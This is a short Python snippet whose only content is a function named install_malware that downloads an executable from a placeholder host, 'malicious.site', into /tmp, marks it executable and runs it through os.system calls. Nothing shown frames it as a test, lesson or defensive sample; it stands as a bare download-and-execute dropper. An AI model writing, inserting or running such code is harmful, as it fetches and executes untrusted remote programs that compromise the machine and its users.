import os

def install_malware():
    os.system("curl http://malicious.site/malware.exe -o /tmp/malware.exe")
    os.system("chmod +x /tmp/malware.exe")
    os.system("/tmp/malware.exe")
